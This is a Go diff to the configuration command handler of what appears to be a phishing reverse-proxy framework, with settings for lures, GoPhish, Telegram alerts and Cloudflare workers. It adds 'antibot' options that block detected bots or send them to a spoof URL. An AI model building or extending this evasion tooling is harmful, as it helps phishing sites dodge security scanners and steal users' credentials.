@@ -265,10 +265,18 @@ func (t *Terminal) handleConfig(args []string) error {
 
 		lureStrategy := t.cfg.GetLureGenerationStrategy()
 
-		keys := []string{"domain", "primary_domain", "domains_count", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "autocert", "http2_enabled", "lure_strategy", "gophish admin_url", "gophish api_key", "gophish insecure", "telegram bot_token", "telegram chat_id", "telegram enabled", "cloudflare_worker account_id", "cloudflare_worker api_token", "cloudflare_worker zone_id", "cloudflare_worker subdomain", "cloudflare_worker enabled"}
+		antibotEnabled := "false"
+		if t.cfg.GetAntibotConfig().Enabled {
+			antibotEnabled = "true"
+		}
+		antibotAction := t.cfg.GetAntibotConfig().Action
+		antibotThreshold := fmt.Sprintf("%.2f", t.cfg.GetAntibotConfig().MLThreshold)
+		antibotOverrideIPs := strconv.Itoa(len(t.cfg.GetAntibotConfig().OverrideIPs))
+
+		keys := []string{"domain", "primary_domain", "domains_count", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "autocert", "http2_enabled", "lure_strategy", "antibot enabled", "antibot action", "antibot threshold", "antibot override_ips", "gophish admin_url", "gophish api_key", "gophish insecure", "telegram bot_token", "telegram chat_id", "telegram enabled", "cloudflare_worker account_id", "cloudflare_worker api_token", "cloudflare_worker zone_id", "cloudflare_worker subdomain", "cloudflare_worker enabled"}
 		primaryDomain := t.cfg.GetPrimaryDomain()
 		domainsCount := strconv.Itoa(len(t.cfg.GetDomains()))
-		vals := []string{t.cfg.general.Domain, primaryDomain, domainsCount, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, http2OnOff, lureStrategy, t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure, t.cfg.GetTelegramBotToken(), t.cfg.GetTelegramChatID(), telegramEnabled, t.cfg.cloudflareWorkerConfig.AccountID, t.cfg.cloudflareWorkerConfig.APIToken, t.cfg.cloudflareWorkerConfig.ZoneID, t.cfg.cloudflareWorkerConfig.WorkerSubdomain, cfWorkerEnabled}
+		vals := []string{t.cfg.general.Domain, primaryDomain, domainsCount, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, http2OnOff, lureStrategy, antibotEnabled, antibotAction, antibotThreshold, antibotOverrideIPs, t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure, t.cfg.GetTelegramBotToken(), t.cfg.GetTelegramChatID(), telegramEnabled, t.cfg.cloudflareWorkerConfig.AccountID, t.cfg.cloudflareWorkerConfig.APIToken, t.cfg.cloudflareWorkerConfig.ZoneID, t.cfg.cloudflareWorkerConfig.WorkerSubdomain, cfWorkerEnabled}
 		log.Printf("\n%s\n", AsRows(keys, vals))
 		return nil
 	} else if pn == 2 {
@@ -416,9 +424,68 @@ func (t *Terminal) handleConfig(args []string) error {
 				t.manageCertificates(false)
 				return nil
 			}
+		case "antibot":
+			switch args[1] {
+			case "override_ips":
+				switch args[2] {
+				case "add":
+					err := t.cfg.AddAntibotOverrideIP(args[3])
+					if err != nil {
+						return err
+					}
+					return nil
+				case "remove":
+					err := t.cfg.RemoveAntibotOverrideIP(args[3])
+					if err != nil {
+						return err
+					}
+					return nil
+				}
+			}
 		}
 	} else if pn == 3 {
 		switch args[0] {
+		case "antibot":
+			switch args[1] {
+			case "enabled":
+				switch args[2] {
+				case "true":
+					t.cfg.SetAntibotEnabled(true)
+					return nil
+				case "false":
+					t.cfg.SetAntibotEnabled(false)
+					return nil
+				}
+			case "action":
+				if args[2] == "block" || args[2] == "spoof" {
+					t.cfg.SetAntibotAction(args[2])
+					return nil
+				}
+				return fmt.Errorf("invalid action: %s (must be 'block' or 'spoof')", args[2])
+			case "spoof_url":
+				t.cfg.SetAntibotSpoofUrl(args[2])
+				return nil
+			case "threshold":
+				threshold, err := strconv.ParseFloat(args[2], 64)
+				if err != nil {
+					return fmt.Errorf("invalid threshold: %s", args[2])
+				}
+				t.cfg.SetAntibotThreshold(threshold)
+				return nil
+			case "override_ips":
+				if args[2] == "list" {
+					ips := t.cfg.GetAntibotConfig().OverrideIPs
+					if len(ips) == 0 {
+						log.Info("antibot override IPs: empty")
+					} else {
+						log.Info("antibot override IPs:")
+						for _, ip := range ips {
+							log.Info("  - %s", ip)
+						}
+					}
+					return nil
+				}
+			}
 		case "domains":
 			switch args[1] {
 			case "add":
